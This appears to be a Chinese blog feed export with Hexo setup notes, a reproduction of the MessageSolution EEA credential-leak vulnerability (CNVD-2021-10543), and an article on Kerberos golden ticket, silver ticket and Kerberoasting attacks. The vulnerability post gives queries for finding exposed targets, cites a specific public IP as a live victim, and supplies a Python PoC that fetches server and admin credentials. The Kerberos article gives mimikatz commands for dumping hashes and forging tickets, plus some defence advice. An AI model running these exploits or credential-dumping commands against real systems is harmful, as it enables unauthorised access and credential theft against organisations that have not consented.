class="headerlink" title="模版"></a>模版</h6><p>hexo new “postName” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo generate #生成静态页面至public目录<br>hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）<br>hexo deploy #将.deploy目录部署到GitHub</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt;</span><br><span class="line">hexo new photo &quot;My Gallery&quot;</span><br><span class="line">hexo new &quot;Hello World&quot; --lang tw</span><br></pre></td></tr></table></figure><h6 id="变量-描述"><a href="#变量-描述" class="headerlink" title="变量    描述"></a>变量    描述</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">layout布局</span><br><span class="line">title标题</span><br><span class="line">date文件建立日期</span><br><span class="line">title: 使用Hexo搭建个人博客</span><br><span class="line">layout: post</span><br><span class="line">date: 2014-03-03 19:07:43</span><br><span class="line">comments: true</span><br><span class="line">categories: Blog</span><br><span class="line">tags: [Hexo]</span><br><span class="line">keywords: Hexo, Blog</span><br><span class="line">description: 生命在于折腾，又把博客折腾到Hexo了。给Hexo点赞。</span><br><span class="line">模版（Scaffold）</span><br><span class="line">hexo new photo &quot;My Gallery&quot;</span><br></pre></td></tr></table></figure><p>变量    描述<br>layout    布局<br>title    标题<br>date    文件建立日期<br>设置文章摘要<br>以上是文章摘要 <a id="more"></a> 以下是余下全文 </p><h5 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &lt;title&gt;</span><br><span class="line">hexo new post &lt;title&gt;</span><br><span class="line"></span><br><span class="line">变量描述</span><br><span class="line">:title标题</span><br><span class="line">:year建立的年份（4 位数）</span><br><span class="line">:month建立的月份（2 位数）</span><br><span class="line">:i_month建立的月份（去掉开头的零）</span><br><span class="line">:day建立的日期（2 位数）</span><br><span class="line">:i_day建立的日期（去掉开头的零）</span><br><span class="line">推送到服务器上</span><br><span class="line">hexo n #写文章</span><br><span class="line">hexo g #生成</span><br><span class="line">hexo d #部署 #可与hexo g合并为 hexo d -g</span><br></pre></td></tr></table></figure><p>报错<br>1.找不到git部署<br>ERROR Deployer not found: git<br>解决方法</p><p>npm install hexo-deployer-git –save</p><p>3.部署类型设置git<br>hexo 3.0 部署类型不再是github，_config.yml 中修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: http:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;deployment.html</span><br><span class="line"></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@***.github.com:***&#x2F;***.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line">4. xcodebuild</span><br><span class="line">xcode-select: error: tool &#39;xcodebuild&#39; requires Xcode, but active developer directory &#39;&#x2F;Library&#x2F;Developer&#x2F;CommandLineTools&#39; is a command line tools instance</span><br></pre></td></tr></table></figure><p>npm install bcrypt</p><ol start="5"><li>RSS不显示<br>安装RSS插件<br>npm install hexo-generator-feed –save</li></ol><p>开启RSS功能<br>编辑hexo/_config.yml，添加如下代码：</p><p>rss: /atom.xml #rss地址  默认即可<br>开启评论<br>1.我使用多说代替自带的评论，在多说 网站注册 &gt; 后台管理 &gt; 添加新站点 &gt; 工具 === 复制通用代码 里面有 short_name</p><p>在根目录 _config.yml 添加一行 disqus_shortname: jslite 是在多说注册时产生的</p><p>复制到 themes\landscape\layout_partial\article.ejs<br>把</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (!index &amp;&amp; post.comments &amp;&amp; config.disqus_shortname)&#123; %&gt;</span><br><span class="line">&lt;section id&#x3D;&quot;comments&quot;&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;disqus_thread&quot;&gt;</span><br><span class="line">  &lt;noscript&gt;Please enable JavaScript to view the &lt;a href&#x3D;&quot;&#x2F;&#x2F;disqus.com&#x2F;?ref_noscript&quot;&gt;comments powered by Disqus.&lt;&#x2F;a&gt;&lt;&#x2F;noscript&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (!index &amp;&amp; post.comments &amp;&amp; config.disqus_shortname)&#123; %&gt;</span><br><span class="line">  &lt;section id&#x3D;&quot;comments&quot;&gt;</span><br><span class="line">    &lt;!-- 多说评论框 start --&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;ds-thread&quot; data-thread-key&#x3D;&quot;&lt;%&#x3D; post.layout %&gt;-&lt;%&#x3D; post.slug %&gt;&quot; data-title&#x3D;&quot;&lt;%&#x3D; post.title %&gt;&quot; data-url&#x3D;&quot;&lt;%&#x3D; page.permalink %&gt;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;!-- 多说评论框 end --&gt;</span><br><span class="line">    &lt;!-- 多说公共JS代码 start (一个网页只需插入一次) --&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    var duoshuoQuery &#x3D; &#123;short_name:&#39;&lt;%&#x3D; config.disqus_shortname %&gt;&#39;&#125;;</span><br><span class="line">      (function() &#123;</span><br><span class="line">        var ds &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">        ds.type &#x3D; &#39;text&#x2F;javascript&#39;;ds.async &#x3D; true;</span><br><span class="line">        ds.src &#x3D; (document.location.protocol &#x3D;&#x3D; &#39;https:&#39; ? &#39;https:&#39; : &#39;http:&#39;) + &#39;&#x2F;&#x2F;static.duoshuo.com&#x2F;embed.js&#39;;</span><br><span class="line">        ds.charset &#x3D; &#39;UTF-8&#39;;</span><br><span class="line">        (document.getElementsByTagName(&#39;head&#39;)[0] </span><br><span class="line">         || document.getElementsByTagName(&#39;body&#39;)[0]).appendChild(ds);</span><br><span class="line">      &#125;)();</span><br><span class="line">      &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;!-- 多说公共JS代码 end --&gt;</span><br><span class="line">  &lt;&#x2F;section&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2021-10543  MessageSolution 邮件归档系统EEA 漏洞复现</title>
      <link href="2021/03/23/cnvd-2021-10543-messagesolution-you-jian-gui-dang-xi-tong-eea-lou-dong-fu-xian/"/>
      <url>2021/03/23/cnvd-2021-10543-messagesolution-you-jian-gui-dang-xi-tong-eea-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h3 id="一-fofa寻找目标"><a href="#一-fofa寻找目标" class="headerlink" title="一 fofa寻找目标"></a>一 fofa寻找目标</h3><p>Fofa搜索：</p><p>title=”MessageSolution Enterprise Email Archiving (EEA)”</p><p>title=”MessageSolution”</p><p><img src="/images/pasted-20.png" alt="upload successful"></p><p>钟馗之眼搜索：</p><p>title:”MessageSolution”</p><h3 id="二-打开https-IP-indexcommon-jsp"><a href="#二-打开https-IP-indexcommon-jsp" class="headerlink" title="二 打开https://IP/indexcommon.jsp"></a>二 打开<a href="https://ip/indexcommon.jsp">https://IP/indexcommon.jsp</a></h3><p><img src="/images/pasted-21.png" alt="upload successful"></p><h3 id="三-访问-authenticationserverservlet目录直接获取Windows服务器账号密码跟后台账号密码"><a href="#三-访问-authenticationserverservlet目录直接获取Windows服务器账号密码跟后台账号密码" class="headerlink" title="三 访问/authenticationserverservlet目录直接获取Windows服务器账号密码跟后台账号密码"></a>三 访问/authenticationserverservlet目录直接获取Windows服务器账号密码跟后台账号密码</h3><p>例如：<a href="https://58.67.197.253/authenticationserverservlet">https://58.67.197.253/authenticationserverservlet</a></p><p><img src="/images/pasted-22.png" alt="upload successful"></p><h3 id="四-用账号密码登录成功，至今还未修复"><a href="#四-用账号密码登录成功，至今还未修复" class="headerlink" title="四 用账号密码登录成功，至今还未修复"></a>四 用账号密码登录成功，至今还未修复</h3><p><img src="/images/pasted-23.png" alt="upload successful"><br>如果别人也在登录，会显示登录失败</p><h3 id="五-cnvd-2021-10543-py"><a href="#五-cnvd-2021-10543-py" class="headerlink" title="五 cnvd-2021-10543.py"></a>五 cnvd-2021-10543.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mVersion: MessageSolution 企业邮件归档管理系统EEA                         \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/authenticationserverservlet/&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 200 and <span class="string">&quot;administrator&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 目标 &#123;&#125; 存在信息泄露 响应为:&#123;&#125;\033[0m&quot;</span>.format(target_url, response.text))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;</span>.format(target_url))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;</span>.format(target_url))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(<span class="string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure><p>执行结果<br><img src="/images/pasted-24.png" alt="upload successful"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>kerberos之猥琐攻击</title>
      <link href="2021/03/23/kerberos-zhi-wei-suo-gong-ji/"/>
      <url>2021/03/23/kerberos-zhi-wei-suo-gong-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="kerberos认证下的猥琐攻击手法"><a href="#kerberos认证下的猥琐攻击手法" class="headerlink" title="kerberos认证下的猥琐攻击手法"></a>kerberos认证下的猥琐攻击手法</h2><h3 id="1-0-黄金票据的原理和条件"><a href="#1-0-黄金票据的原理和条件" class="headerlink" title="1.0 黄金票据的原理和条件"></a>1.0 黄金票据的原理和条件</h3><p><img src="/images/pasted-0.png" alt="upload successful"></p><p>黄金票据是伪造票据授予票据（TGT）。</p><p>票据授予票据（TGT），也被称为认证票据</p><p>黄金票据特点:</p><p>1.与域控制器没有AS-REQ或AS-REP通信<br>2.需要krbtgt用户的hash（KDC Hash）<br>3.由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到域控制器以获得服务票据<br>我们可以看一个图理解一下：</p><p><img src="/images/pasted-1.png" alt="upload successful"></p><p>Kerberos黄金票据是有效的TGT Kerberos票据，因为它是由域Kerberos帐户（KRBTGT）加密和签名的。TGT仅用于向域控制器上的KDC服务证明用户已被其他域控制器认证。TGT被KRBTGT密码散列加密并且可以被域中的任何KDC服务解密的。</p><h6 id="黄金票据的条件要求："><a href="#黄金票据的条件要求：" class="headerlink" title="黄金票据的条件要求："></a>黄金票据的条件要求：</h6><p>1.域名称<br>2.域的SID值<br>3.域的KRBTGT账户NTLM密码哈希<br>4.伪造用户名<br>1.1 实战手法<br>我们这里在一台域服务器中抓取到了KRBTGT账户的账号密码（hash）</p><p><img src="/images/pasted-2.png" alt="upload successful"></p><p>那么这里我们可以直接使用cobalt strike来利用黄金票据</p><p><img src="/images/pasted-3.png" alt="upload successful"></p><p>填入必须值</p><p><img src="/images/pasted-4.png" alt="upload successful"></p><p>就可以了</p><p><img src="/images/pasted-5.png" alt="upload successful"></p><p>在TGT的使用期限超过20分钟之前，域控制器KDC服务不会验证TGT中的用户帐户，这意味着我们可以使用已禁用/删除的帐户，甚至可以使用Active Directory中不存在的虚构帐户。</p><p>由于在域控制器上由KDC服务生成票证时会在票证上设置域Kerberos策略，因此当提供票证时，系统会信任票证的有效性。这意味着即使域策略声明Kerberos登录票证（TGT）仅有效期为10个小时，如果票证声明其有效期为10年，则是10年。</p><p>该KRBTGT帐户密码从不更改*和直到KRBTGT密码被更改（两次），我们可以创建黄金票据。注意，即使模拟的用户更改了密码，为模拟用户而创建的黄金票据也会保留。</p><p>黄金票据可以绕过了SmartCard身份验证要求，因为它绕过了DC在创建TGT之前执行的常规检查。</p><p>黄金票证（TGT）可以在任何计算机上生成和使用，即使其中一台未加入域也是可以的。</p><p>当然我们也可以使用Mimikatz伪造Kerberos票证：</p><p>1.2 Mimikatz命令示例：<br>kerberos :: golden / admin：ADMIINACCOUNTNAME / domain：DOMAINFQDN / id：ACCOUNTRID / sid：DOMAINSID / krbtgt：KRBTGTPASSWORDHASH / ptt</p><p><img src="/images/pasted-6.png" alt="upload successful"></p><p>Mimikatz创建黄金的命令是“kerberos :: golden”</p><p>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:<KRBTGT NTLM Hash> /user:&lt;任意用户名&gt; /ptt” exit</p><p>/domain —–完整的域名，在这个例子中：“lab.adsecurity.org”</p><p>/ sid —-域的SID,在这个例子中：“S-1-5-21-1473643419-774954089-2222329127”</p><p>/ sids — AD森林中账户/组的额外SID，凭证拥有权限进行欺骗。通常这将是根域Enterprise Admins组的“S-1-5-21-1473643419-774954089-5872329127-519”值。Ť </p><p> / user —伪造的用户名</p><p>/ groups（可选）—用户所属的组RID（第一组是主组）。添加用户或计算机帐户RID以接收相同的访问权限。默认组：513,512,520,518,519为默认的管理员组。</p><p>/ krbtgt—域KDC服务帐户（KRBTGT）的NTLM密码哈希值。用于加密和签署TGT。</p><p>/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用或使用/ ptt立即将黄金票据插入内存以供使用。</p><p>/ ptt - 作为/ ticket的替代品 - 使用它来立即将伪造的票据插入到内存中以供使用。</p><p>/ id（可选） - 用户RID。Mimikatz默认值是500（默认管理员帐户RID）。</p><p>/ startoffset（可选） - 票据可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值是0。</p><p>/ endin（可选） - 票据使用时间范围。Mimikatz默认值是10年（〜5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。</p><p>/ renewmax（可选） - 续订最长票据有效期。Mimikatz默认值是10年（〜5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。</p><p>/ sids（可选） - 设置为AD林中企业管理员组（ADRootDomainSID）-519）的SID，以欺骗整个AD林（AD林中每个域中的AD管理员）的企业管理权限。</p><p>/ aes128 - AES128密钥</p><p>/ aes256 - AES256密钥</p><p>黄金票默认组：</p><p>域用户SID：S-1-5-21 <DOMAINID> -513</p><p>域管理员SID：S-1-5-21 <DOMAINID> -512</p><p>架构管理员SID：S-1-5-21 <DOMAINID> -518</p><p>企业管理员SID：S-1-5-21 <DOMAINID> -519（只有在森林根域中创建伪造票证时才有效，但为AD森林管理员权限添加使用/ sids参数）</p><p>组策略创建者所有者SID：S-1-5-21 <DOMAINID> -520</p><p>命令格式如下：</p><p>kerberos :: golden / user：ADMIINACCOUNTNAME / domain：DOMAINFQDN / id：ACCOUNTRID / sid：DOMAINSID / krbtgt：KRBTGTPASSWORDHASH / ptt</p><p>命令示例：<br>.\mimikatz “kerberos::golden  /user:DarthVader  /domain:rd.lab.adsecurity.org  /id:500 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321  /ptt” exit</p><h3 id="2-0-白银票据的原理和条件"><a href="#2-0-白银票据的原理和条件" class="headerlink" title="2.0 白银票据的原理和条件"></a>2.0 白银票据的原理和条件</h3><p>银票是伪造的票证授予服务票，也称为服务票。</p><p>如下图所示，与域控制器之间没有AS-REQ / AS-REP（步骤1和2），也没有TGS-REQ / TGS-REP（步骤3和4）通信。由于白银票据是伪造的TGS，因此无法与域控制器通信。</p><p><img src="/images/pasted-7.png" alt="upload successful"></p><p>该Kerberos的银票是有效的票证授予服务（TGS）Kerberos票据，它是加密/通过与配置的服务帐户登录服务主体名称为每个服务器与Kerberos身份验证的服务运行。</p><p>黄金票证是伪造的TGT，可有效访问任何Kerberos服务，而银票证是伪造的TGS。这意味着银票范围仅限于特定服务器上针对的任何服务。</p><p>使用域Kerberos服务帐户（KRBTGT）对黄金票证进行加密/签名时，通过服务帐户（从计算机的本地SAM或服务帐户凭据中提取的计算机帐户凭据）对银票进行加密/签名。</p><p>大多数服务不会验证PAC（通过将PAC校验和发送到域控制器以进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以包含完全虚构的PAC-甚至声称用户是域管理员。</p><p>TGS是伪造的，因此没有关联的TGT，这意味着不用链接DC，任何事件日志都位于目标服务器上。尽管范围比金牌更有限，但所需的哈希值更容易获得，并且在使用时与DC没有通信，因此检测比黄金票证更困难。</p><p>2.1 条件<br>当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。</p><p>/target –目标服务器的FQDN</p><p>FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”）</p><p>/service –运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等</p><p>/rc4 –服务的NTLM散列（计算机帐户或用户帐户）</p><blockquote><p>PS:Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。<br>所以，一切凭据都来源于Server Hash。</p></blockquote><p>2.2 伪造白银票据(Silver Tickets)<br>首先需要导出Server Hash：</p><p>管理员权限运行mimikatz</p><p>mimikatz “privilege::debug” “sekurlsa::logonpasswords” “exit”  &gt; “C:\Users\Administrator.WEB\Desktop\1.txt”<br>privilege::debug #提升权限<br>sekurlsa::logonpasswords #获取service账户hash 和sid(同一个域下得sid一样)</p><p>我这里在cobalt strike中演示</p><p><img src="/images/pasted-8.png" alt="upload successful"></p><p>空本地票据缓存</p><p>kerberos::purge #清理本地票据缓存<br>kerberos::list #查看本地保存的票据</p><p><img src="/images/pasted-9.png" alt="upload successful"></p><p>伪造白银票据并导入</p><p>mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:<NTLM Hash> /user:&lt;用户名&gt; /ptt” exit</p><p><img src="/images/pasted-10.png" alt="upload successful"></p><p>Mimikatz命令示例：<br>/domain –完整的域名称，如：lab.adsecurity.org</p><p>/sid –域的SID，如：S-1-5-21-1473643419-774954089-2222329127</p><p>/user – 域用户名</p><p>/ groups（可选） - 用户所属的组RID</p><p>/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用，或者使用/ ptt立即将黄金票据插入到内存中以供使用</p><p> /ptt - 作为/ ticket的替代品，使用它来立即将伪造的票据插入到内存中以供使用。</p><p>/ id（可选） - 用户RID，Mimikatz默认值是500（默认管理员帐户RID）</p><p>/ startoffset（可选） - 票证可用时的起始偏移（如果使用此选项，通常设置为-10或0）Mimikatz默认值是0</p><p>/ endin（可选） - 票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为10小时</p><p>/ renewmax（可选） - 续订最长票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为最长为7天</p><p> 白银票据默认组</p><p>域用户SID：S-1-5-21 <DOMAINID> -513<br>域管理员SID：S-1-5-21 <DOMAINID> -512<br>架构管理员SID：S-1-5-21 <DOMAINID> -518<br>企业管理员SID：S-1-5-21 <DOMAINID> -519<br>组策略创建所有者SID：S-1-5-21 <DOMAINID> -520<br>白银票据在各种服务中的实列<br> Service Type                                  Service Silver Tickets<br> WMI                                           HOST RPCSS<br> PowerShell Remoting                           HOST  HTTP<br> WinRM                                         HOST  HTTP<br> Scheduled Tasks                               HOST<br> Windows File Share (CIFS)                     CIFS</p><p> LDAP operations including<br> Mimikatz DCSync                               LDAP</p><p> Windows Remote Server Administration Tools    RPCSS LDAP CIFS</p><p>伪造Windows共享（CIFS）管理访问的银票</p><p>通过为cifs服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限</p><h3 id="3-0-黄金票据和白银票据区别"><a href="#3-0-黄金票据和白银票据区别" class="headerlink" title="3.0 黄金票据和白银票据区别"></a>3.0 黄金票据和白银票据区别</h3><p>1.TGS ticket针对的是某个机器上的某个服务，TGT针对的是所有机器的所有服务<br>2.TGT利用krbtgt账户的hash，TGS ticket利用的是服务账户的hash（目标机的hash,以计算机名$显示的账户）</p><p>黄金票据的实验结果：<br>能够在域里边所有机器上都以administrator登录</p><p>白银票据的实验结果：<br>以前就能够psexec的，使用白银票据添加cifs为administrator权限后，能够在psexec之后以administrator登录</p><p>以前就不能后动psexesvc的机器，实用白银票据添加cifs后，dir由无权查看变为有权查看</p><p>hash位置<br>运行中的系统，需要从内存抓取-&gt;lassas.exe进程里边存放的是活动用户的hash（当前登录的用户）普通域用户或普通工作组：SAM文件（加密后的用户密码）/SYSTEM文件（秘钥）windows/system32/config/SAM存的是当前机器所用户的Hash</p><p>域控：ntds.dit所有域用户的账号/密码（hash）</p><h3 id="4-0-检测伪造的Kerberos票证"><a href="#4-0-检测伪造的Kerberos票证" class="headerlink" title="4.0 检测伪造的Kerberos票证"></a>4.0 检测伪造的Kerberos票证</h3><p>4.1 白银票据(Silver Tickets)防御<br>1.尽量保证服务器凭证不被窃取</p><p>2.开启PAC (Privileged Attribute Certificate) 特权属性证书保护 功能，PAC主要是规定服务器将票据发送给kerberos服务，由 kerberos服务验证票据是否有效。</p><p>开启方式:</p><p>将注册表中</p><p>HKEY_LOCAL_MACHINE\SYSTEM \ CurrentControlSet\Control\Lsa\Kerberos\Parameters</p><p>中的ValidateKdcPacSignature设置为1。<br>3.侦测</p><p>监视异常的Kerberos活动，例如Windows登录/注销事件中的格式错误或空白字段（事件ID 4624、4634、4672）。[2]</p><p>监视与lsass.exe交互的意外进程。[6]诸如Mimikatz之类的通用凭证转储者通过打开进程，找到LSA秘密密钥并解密内存中存储凭证详细信息（包括Kerberos票证）的部分，来访问LSA子系统服务（LSASS）进程。</p><p>4.2 黄金票据(Silver Tickets)防御</p><p>1.限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机。这降低攻击者通过横向扩展，获取域管理员的账户，获得访问域控制器的Active Directory的ntds.dit的权限。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。</p><p>2.建议定期更改KRBTGT密码。更改一次，然后让AD备份，并在12到24小时后再次更改它。这个过程应该对系统环境没有影响。这个过程应该是确保KRBTGT密码每年至少更改一次的标准方法。</p><p>3.一旦攻击者获得了KRBTGT帐号密码哈希的访问权限，就可以随意创建黄金票据。通过快速更改KRBTGT密码两次，使任何现有的黄金票据（以及所有活动的Kerberos票据）失效。这将使所有Kerberos票据无效，并消除攻击者使用其KRBTGT创建有效金票的能力。</p><p>4.侦测<br>监视异常的Kerberos活动，例如Windows登录/注销事件（事件ID 4624、4672、4634）中的格式错误或空白字段，TGT中的RC4加密以及TGS请求，而无需前面的TGT请求。</p><p>监视TGT票证的生存期，以获取与默认域持续时间不同的值。</p><h3 id="5-0-Kerberoasting攻击"><a href="#5-0-Kerberoasting攻击" class="headerlink" title="5.0 Kerberoasting攻击"></a>5.0 Kerberoasting攻击</h3><p><img src="/images/pasted-11.png" alt="upload successful"></p><p>Kerberos协议在请求访问某个服务时存在一个缺陷，Kerberoasting正是利用这个缺陷的一种攻击技术。</p><p>我们可以破解服务帐户密码，而无需拿到管理员的账号密码哈希。我们通过在主机中使用服务帐户请求TGS票证多项服务。从内存中导出TGS票证，然后破解就可以。也可以通过嗅探网络流量并脱机获取使用RC4_HMAC_MD5加密的Kerberos TGS票证来攻击。</p><p>5.1 攻击流程<br>1、用户将AS-REQ数据包发送给KDC（Key Distribution Centre，密钥分发中心，此处为域控），进行身份认证。</p><p>2、KDC验证用户的凭据，如果凭据有效，则返回TGT（Ticket-Granting Ticket，票据授予票据）。</p><p>3、如果用户想通过身份认证，访问某个服务（如IIS），那么他需要发起（Ticket Granting Service，票据授予服务）请求，请求中包含TGT以及所请求服务的SPN（Service Principal Name，服务主体名称）。</p><p>4、如果TGT有效并且没有过期，TGS会创建用于目标服务的一个服务票据。服务票据使用服务账户的凭据进行加密。</p><p>5、用户收到包含加密服务票据的TGS响应数据包。</p><p>6、最后，服务票据会转发给目标服务，然后使用服务账户的凭据进行解密。</p><p>整个过程比较简单，我们需要注意的是，服务票据会使用服务账户的哈希进行加密，这样一来，Windows域中任何经过身份验证的用户都可以从TGS处请求服务票据，然后离线暴力破解。</p><p>5.2 实战手法</p><p>1.SPN扫描具有服务帐户的SQL Server</p><p><img src="/images/pasted-12.png" alt="upload successful"></p><p>2.确定目标之后，我们使用PowerShell请求此服务主体名称（SPN）的服务票证。</p><p><img src="/images/pasted-13.png" alt="upload successful"></p><p>查看数据包捕获，我们可以看到Kerberos通信，并注意到票证是RC4-HMAC-MD5。</p><p><img src="/images/pasted-14.png" alt="upload successful"></p><p>3.客户端收到票证后，我们可以使用Mimikatz（或其他）导出用户存储空间中的所有Kerberos票证。</p><p><img src="/images/pasted-15.png" alt="upload successful"></p><p>4.将服务票证导出到文件后，可以将该文件发送到运行带有Kerberoast的Kali Linux的攻击者计算机。破解与票证（文件）相关的服务帐户的密码。</p><p><img src="/images/pasted-16.png" alt="upload successful"><br>tips:</p><p>由于服务帐户通常在许多企业中被过度使用，并且密码通常很弱，因此这是我们从域用户转到域管理员的简便方法。</p><p>5.3 